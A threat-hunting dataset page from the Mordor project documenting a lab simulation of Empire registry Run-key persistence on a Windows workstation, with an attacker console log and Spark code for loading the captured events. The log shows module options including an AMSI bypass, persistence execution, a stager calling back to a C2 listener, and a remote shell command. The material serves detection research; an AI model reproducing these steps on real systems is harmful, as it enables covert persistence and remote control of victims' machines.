# Empire Userland Registry Run Key

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-190319023812 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2019/03/19 |
| platform              | Windows |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | [] |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_userland_registry_run_key.zip |
| References        | None |

## Dataset Description
This dataset represents adversaries modifying HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry keys for persistence. It also captures the execution of the persistence mechanism.

## Adversary View
```
(Empire: stager/multi/launcher) > 
(Empire: stager/multi/launcher) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5376   5/0.0    2020-09-04 07:02:57  http            

(Empire: agents) > interact KU86XWEL
(Empire: KU86XWEL) > 
(Empire: KU86XWEL) > usemodule persistence/
elevated/registry*                 misc/add_netuser                   misc/install_ssp*                  powerbreach/resolver
elevated/rid_hijack*               misc/add_sid_history*              misc/memssp*                       userland/backdoor_lnk
elevated/schtasks*                 misc/debugger*                     misc/skeleton_key*                 userland/registry
elevated/wmi*                      misc/disable_machine_acct_change*  powerbreach/deaduser               userland/schtasks
elevated/wmi_updater*              misc/get_ssps                      powerbreach/eventlog*              
(Empire: KU86XWEL) > usemodule persistence/userland/registry
(Empire: powershell/persistence/userland/registry) > info

              Name: Invoke-Registry
            Module: powershell/persistence/userland/registry
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y
  @enigma0x3

Description:
  Persist a stager (or script) via the
  HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
  key. This has an easy detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  Agent            True        KU86XWEL                  Agent to run module on.                 
  Listener         False                                 Listener to use.                        
  Obfuscate        False       False                     Switch. Obfuscate the launcher          
                                                        powershell code, uses the               
                                                        ObfuscateCommand for obfuscation types. 
                                                        For powershell only.                    
  ObfuscateCommand False       Token\All\1               The Invoke-Obfuscation command to use.  
                                                        Only used if Obfuscate switch is True.  
                                                        For powershell only.                    
  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in 
                                                        the stager code.                        
  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   
                                                        the stager code.                        
  KeyName          True        Updater                   Key name for the run trigger.           
  RegPath          False       HKCU:Software\Microsoft\  Registry location to store the script   
                              Windows\CurrentVersion\D  code. Last element is the key name.     
                              ebug                    
  ADSPath          False                                 Alternate-data-stream location to store 
                                                        the script code.                        
  EventLogID       False                                 Store the script in the Application     
                                                        event log under the specified EventID.  
                                                        The ID needs to be unique/rare!         
  ExtFile          False                                 Use an external file for the payload    
                                                        instead of a stager.                    
  Cleanup          False                                 Switch. Cleanup the trigger and any     
                                                        script from specified location.         
  UserAgent        False       default                   User-agent string to use for the staging
                                                        request (default, none, or other).      
  Proxy            False       default                   Proxy to use for request (default, none,
                                                        or other).                              
  ProxyCreds       False       default                   Proxy credentials                       
                                                        ([domain\]username:password) to use for 
                                                        request (default, none, or other).      

(Empire: powershell/persistence/userland/registry) > set Listener http
(Empire: powershell/persistence/userland/registry) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked KU86XWEL to run TASK_CMD_WAIT
[*] Agent KU86XWEL tasked with task ID 1
[*] Tasked agent KU86XWEL to run module powershell/persistence/userland/registry
(Empire: powershell/persistence/userland/registry) > 
Registry persistence established using listener http stored in HKCU:Software\Microsoft\Windows\CurrentVersion\Debug.

(Empire: powershell/persistence/userland/registry) > 
(Empire: powershell/persistence/userland/registry) > 
[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
[*] New agent SP7B3U2X checked in
[+] Initial agent SP7B3U2X from 172.18.39.5 now active (Slack)
[*] Sending agent (stage 2) to SP7B3U2X at 172.18.39.5

(Empire: powershell/persistence/userland/registry) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            
SP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         1376   5/0.0    2020-09-04 07:09:04  http            

(Empire: agents) > interact SP7B3U2X
(Empire: SP7B3U2X) > shell whoami
[*] Tasked SP7B3U2X to run TASK_SHELL
[*] Agent SP7B3U2X tasked with task ID 1
(Empire: SP7B3U2X) > 
theshire\pgustavo
..Command execution completed.

(Empire: SP7B3U2X) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_userland_registry_run_key.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        